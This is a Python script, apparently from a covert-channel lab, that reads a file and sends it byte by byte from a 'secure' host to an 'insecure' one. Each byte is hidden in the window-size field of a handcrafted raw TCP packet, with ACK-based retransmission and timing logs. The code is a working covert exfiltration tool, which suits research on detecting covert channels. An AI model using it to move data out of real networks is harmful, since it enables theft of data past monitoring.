#!/usr/bin/env python3
import os
import sys
import time
import random
import socket
import struct
import math
from ctypes import *
from array import array

# Constants
DEST_PORT = 8888
SRC_PORT = 8888
PACKET_SIZE = 65535
BUFFER_SIZE = 65535

# Pseudo header for TCP checksum calculation
class PseudoHeader(Structure):
    _fields_ = [
        ("src_addr", c_uint32),
        ("dst_addr", c_uint32),
        ("placeholder", c_uint8),
        ("protocol", c_uint8),
        ("tcp_len", c_uint16)
    ]

def checksum(data):
    """Calculate checksum of the given data"""
    if len(data) % 2 == 1:
        data += b'\0'
    s = sum(array('H', data))
    s = (s >> 16) + (s & 0xffff)
    s += s >> 16
    s = ~s
    return socket.ntohs(s & 0xffff)

def get_usec():
    """Get current time in microseconds"""
    return int(time.time() * 1000000)

def send_covert_data(message, dest_ip, src_ip, delay_seconds=0.5, repeat=1, logfile_name="sent_log.csv"):
    """
    Send covert data using TCP window size with stop-and-wait protocol
    
    Args:
        message (bytes): Data to send covertly
        dest_ip (str): Destination IP address
        src_ip (str): Source IP address
        delay_seconds (float): Mean delay between packets
        repeat (int): Number of times to repeat transmission
        logfile_name (str): Log file to write
    """
    # Create a raw socket for sending
    try:
        send_sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
    except socket.error as e:
        print(f"Error creating send socket: {e}")
        print("Note: This script requires root privileges")
        sys.exit(1)
    
    # Create a raw socket for receiving ACKs
    try:
        recv_sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
        recv_sock.settimeout(2.0)  # 2 second timeout for ACK reception
    except socket.error as e:
        print(f"Error creating receive socket: {e}")
        send_sock.close()
        sys.exit(1)
    
    # Tell kernel we'll add IP header
    send_sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    
    # Destination address
    dest_addr = (dest_ip, 0)  # Port is in the TCP header
    
    # Add EOF marker
    message = message + b'\x04'  # EOF
    
    # Open log file
    with open(logfile_name, "w") as logfile:
        logfile.write("run,index,ascii,time_us,retransmissions\n")
        
        for r in range(1, repeat + 1):
            print(f"\n[=== RUN {r} ===]")
            start_usec = get_usec()
            
            for i, char in enumerate(message):
                seq_num = 2000 + i
                retransmissions = 0
                ack_received = False
                
                while not ack_received and retransmissions < 15:  # Increased from 5 to 15 retransmissions
                    # Create IP header
                    ip_ihl = 5
                    ip_ver = 4
                    ip_tos = 0
                    ip_tot_len = 20 + 20  # IP header + TCP header
                    ip_id = random.randint(0, 65535)
                    ip_frag_off = 0
                    ip_ttl = 64
                    ip_proto = socket.IPPROTO_TCP
                    ip_check = 0
                    ip_saddr = socket.inet_aton(src_ip)
                    ip_daddr = socket.inet_aton(dest_ip)
                    
                    ip_ihl_ver = (ip_ver << 4) + ip_ihl
                    
                    # Pack IP header
                    ip_header = struct.pack('!BBHHHBBH4s4s',
                        ip_ihl_ver, ip_tos, ip_tot_len, ip_id, ip_frag_off, ip_ttl, 
                        ip_proto, ip_check, ip_saddr, ip_daddr)
                    
                    # TCP header fields
                    tcp_source = SRC_PORT
                    tcp_dest = DEST_PORT
                    tcp_seq = seq_num
                    tcp_ack_seq = 0
                    tcp_doff = 5  # Header length in 32-bit words
                    tcp_flags = 0x10  # ACK flag
                    tcp_window = char  # Covert data is embedded in window size
                    tcp_check = 0
                    tcp_urg_ptr = 0
                    
                    # TCP header packing (excluding checksum)
                    tcp_offset_res = (tcp_doff << 4) + 0
                    tcp_flags = tcp_flags
                    
                    tcp_header = struct.pack('!HHLLBBHHH',
                        tcp_source, tcp_dest, tcp_seq, tcp_ack_seq, tcp_offset_res,
                        tcp_flags, tcp_window, tcp_check, tcp_urg_ptr)
                    
                    # TCP pseudo header for checksum calculation
                    src_addr = socket.inet_aton(src_ip)
                    dst_addr = socket.inet_aton(dest_ip)
                    placeholder = 0
                    protocol = socket.IPPROTO_TCP
                    tcp_length = len(tcp_header)
                    
                    # Create pseudo packet for checksum calculation
                    psh = struct.pack('!4s4sBBH', src_addr, dst_addr, placeholder, protocol, tcp_length)
                    pseudo_packet = psh + tcp_header
                    
                    # Calculate TCP checksum
                    tcp_check = checksum(pseudo_packet)
                    
                    # Construct TCP header again with correct checksum
                    tcp_header = struct.pack('!HHLLBBHHH',
                        tcp_source, tcp_dest, tcp_seq, tcp_ack_seq, tcp_offset_res,
                        tcp_flags, tcp_window, tcp_check, tcp_urg_ptr)
                    
                    # Final packet
                    packet = ip_header + tcp_header
                    
                    # Send packet
                    send_sock.sendto(packet, dest_addr)
                    
                    if retransmissions == 0:
                        if char >= 32 and char <= 126:
                            print(f"[>] Sent byte '{chr(char)}' ({char}) - seq {seq_num}")
                        else:
                            print(f"[>] Sent byte [ASCII {char}] - seq {seq_num}")
                    else:
                        print(f"[>] Retransmission #{retransmissions} for seq {seq_num}")
                    
                    # Wait for ACK from receiver - increase timeout for later retransmissions
                    base_timeout = 2.0
                    timeout_multiplier = 1.0 + (retransmissions * 0.5)  # Exponential backoff
                    ack_timeout = time.time() + (base_timeout * timeout_multiplier)
                    ack_attempts = 0
                    max_ack_attempts = 15  # Increased from 10 to 15
                    
                    while time.time() < ack_timeout and ack_attempts < max_ack_attempts:
                        try:
                            ack_packet = recv_sock.recvfrom(BUFFER_SIZE)[0]
                            ack_attempts += 1
                            
                            # Extract IP header
                            ip_header_recv = ack_packet[0:20]
                            iph = struct.unpack('!BBHHHBBH4s4s', ip_header_recv)
                            
                            # IP header length
                            ihl = (iph[0] & 0xF)
                            iph_length = ihl * 4
                            
                            # Check protocol
                            protocol = iph[6]
                            if protocol != socket.IPPROTO_TCP:
                                continue
                            
                            # Extract source and destination IP
                            s_addr = socket.inet_ntoa(iph[8])
                            d_addr = socket.inet_ntoa(iph[9])
                            
                            # Only process packets from our receiver
                            if s_addr != dest_ip:
                                continue
                            
                            # Extract TCP header with corruption checking
                            try:
                                tcp_header_recv = ack_packet[iph_length:iph_length+20]
                                if len(tcp_header_recv) < 20:
                                    continue  # Truncated packet
                                    
                                tcph = struct.unpack('!HHLLBBHHH', tcp_header_recv)
                                
                                # TCP header fields
                                source_port = tcph[0]
                                dest_port = tcph[1]
                                sequence = tcph[2]
                                acknowledgement = tcph[3]
                                tcp_flags = tcph[5]
                                
                                # Validate TCP header fields
                                if source_port == 0 or dest_port == 0:
                                    continue  # Invalid ports
                                
                                if tcp_flags == 0:
                                    continue  # No flags set
                                
                                # Check if this is an ACK for our sequence number
                                # Be more flexible with ACK matching due to potential corruption
                                if (tcp_flags & 0x10):  # ACK flag set
                                    # Accept ACKs from the correct port with reasonable acknowledgment values
                                    if (source_port == DEST_PORT and dest_port == SRC_PORT):
                                        
                                        # Check if acknowledgment is in reasonable range
                                        expected_ack = seq_num + 1
                                        
                                        if acknowledgement == expected_ack:
                                            # Perfect match - receiver got this exact packet
                                            print(f"[✓] Received ACK for seq {seq_num}")
                                            ack_received = True
                                            break
                                        elif acknowledgement >= expected_ack and acknowledgement <= expected_ack + 10:
                                            # Forward ACK - receiver is ahead, which is good
                                            print(f"[✓] Received forward ACK for seq {seq_num} (ack={acknowledgement}, expected={expected_ack})")
                                            ack_received = True
                                            break
                                        elif acknowledgement >= seq_num and acknowledgement < expected_ack:
                                            # Cumulative ACK for this or previous packet
                                            print(f"[✓] Received cumulative ACK for seq {seq_num} (ack={acknowledgement})")
                                            ack_received = True
                                            break
                                        elif abs(acknowledgement - expected_ack) <= 5:
                                            # Close match, might be corrupted but reasonable
                                            print(f"[✓] Received approximate ACK for seq {seq_num} (ack={acknowledgement}, expected={expected_ack})")
                                            ack_received = True
                                            break
                                        else:
                                            # Log but continue searching
                                            if ack_attempts % 3 == 0:  # Don't spam
                                                print(f"[?] Received ACK with unexpected ack_seq {acknowledgement} (expected ~{expected_ack})")
                                
                            except struct.error:
                                # Corrupted TCP header
                                continue
                            except Exception as e:
                                # Other corruption
                                continue
                                
                        except socket.timeout:
                            break
                        except Exception as e:
                            # Socket error or other issue
                            continue
                    
                    if not ack_received:
                        retransmissions += 1
                        if retransmissions < 15:
                            print(f"[!] Timeout waiting for ACK for seq {seq_num} (tried {ack_attempts} packets), retransmitting...")
                        else:
                            print(f"[!] Max retransmissions (15) reached for seq {seq_num}")
                            # Final desperate attempt with longer timeout
                            print(f"[!] Making final attempt for seq {seq_num} with extended timeout...")
                            
                            # Send one more time
                            send_sock.sendto(packet, dest_addr)
                            
                            # Wait much longer for this final ACK
                            final_timeout = time.time() + 5.0  # 5 second timeout
                            final_attempts = 0
                            
                            while time.time() < final_timeout and final_attempts < 20:
                                try:
                                    ack_packet = recv_sock.recvfrom(BUFFER_SIZE)[0]
                                    final_attempts += 1
                                    
                                    # Same ACK processing logic as before
                                    ip_header_recv = ack_packet[0:20]
                                    iph = struct.unpack('!BBHHHBBH4s4s', ip_header_recv)
                                    ihl = (iph[0] & 0xF)
                                    iph_length = ihl * 4
                                    protocol = iph[6]
                                    
                                    if protocol != socket.IPPROTO_TCP:
                                        continue
                                    
                                    s_addr = socket.inet_ntoa(iph[8])
                                    if s_addr != dest_ip:
                                        continue
                                    
                                    try:
                                        tcp_header_recv = ack_packet[iph_length:iph_length+20]
                                        if len(tcp_header_recv) < 20:
                                            continue
                                            
                                        tcph = struct.unpack('!HHLLBBHHH', tcp_header_recv)
                                        source_port = tcph[0]
                                        dest_port = tcph[1]
                                        acknowledgement = tcph[3]
                                        tcp_flags = tcph[5]
                                        
                                        if (tcp_flags & 0x10) and source_port == DEST_PORT and dest_port == SRC_PORT:
                                            expected_ack = seq_num + 1
                                            
                                            if (acknowledgement == expected_ack or 
                                                abs(acknowledgement - expected_ack) <= 10):
                                                print(f"[✓] Final attempt successful! Received ACK for seq {seq_num}")
                                                ack_received = True
                                                break
                                    except:
                                        continue
                                        
                                except socket.timeout:
                                    break
                                except:
                                    continue
                            
                            if not ack_received:
                                print(f"[✗] Final attempt failed for seq {seq_num}, giving up...")
                            
                            # Wait longer before giving up completely in corrupted environment
                            time.sleep(0.5)
                            break
                
                # Log
                usec = get_usec()
                logfile.write(f"{r},{i},{char},{usec},{retransmissions}\n")
                
                # Add a small delay before next packet
                if ack_received:
                    time.sleep(0.1)  # Small delay for successful transmission
                else:
                    time.sleep(0.5)  # Longer delay if we gave up on ACK
            
            end_usec = get_usec()
            duration = (end_usec - start_usec) / 1000000.0
            throughput = len(message) / duration
            
            print(f"[✔] Run {r} complete: {duration:.2f} seconds, {throughput:.2f} bytes/sec")
    
    send_sock.close()
    recv_sock.close()
    print("[✔] Transmission complete.")

def main():
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <file_to_send> [--delay=0.5] [--repeat=1] [--logfile=sent_log.csv]")
        sys.exit(1)
    
    delay_seconds = 0.5
    repeat = 1
    logfile_name = "sent_log.csv"
    
    # Parse command line arguments
    for arg in sys.argv[2:]:
        if arg.startswith("--delay="):
            delay_seconds = float(arg[8:])
        elif arg.startswith("--repeat="):
            repeat = int(arg[9:])
        elif arg.startswith("--logfile="):
            logfile_name = arg[10:]
    
    # Read the file to send
    try:
        with open(sys.argv[1], "rb") as f:
            message = f.read()
    except Exception as e:
        print(f"Error reading file: {e}")
        sys.exit(1)
    
    # Get IP addresses from environment
    dest_ip = os.getenv('INSECURENET_HOST_IP')
    src_ip = os.getenv('SECURENET_HOST_IP')
    
    if not dest_ip or not src_ip:
        print("ENV INSECURENET_HOST_IP or SECURENET_HOST_IP not set")
        sys.exit(1)
    
    # Send the data
    send_covert_data(message, dest_ip, src_ip, delay_seconds, repeat, logfile_name)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] Interrupted by user")
        sys.exit(0) 